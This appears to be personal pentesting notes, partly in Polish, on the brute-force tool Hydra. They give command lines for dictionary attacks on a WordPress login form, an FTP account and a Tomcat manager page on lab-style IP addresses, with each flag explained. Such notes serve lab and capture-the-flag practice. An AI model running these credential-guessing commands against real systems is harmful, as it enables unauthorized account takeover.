# hydra

```bash
hydra -L <USERS.TXT> -P <PASSWORDS.TXT>
```

```bash
hydra -L <USERS.TXT> -P <PASSWORDS.TXT> http-post-form '/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username'

http-post-form -> [path:payload:filter_string]

```

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

```
hydra                   Runs the hydra tool

-t 4                    Number of parallel connections per target

-l [user]               Points to the user who's account you're trying to compromise

-P [path to dictionary] Points to the file containing the list of possible passwords

-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]            The IP address of the target machine

ftp / protocol          Sets the protocol

-s port

```

**Atak na tomcata**

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.173.163 -s 1234 http-get /manager/html
```
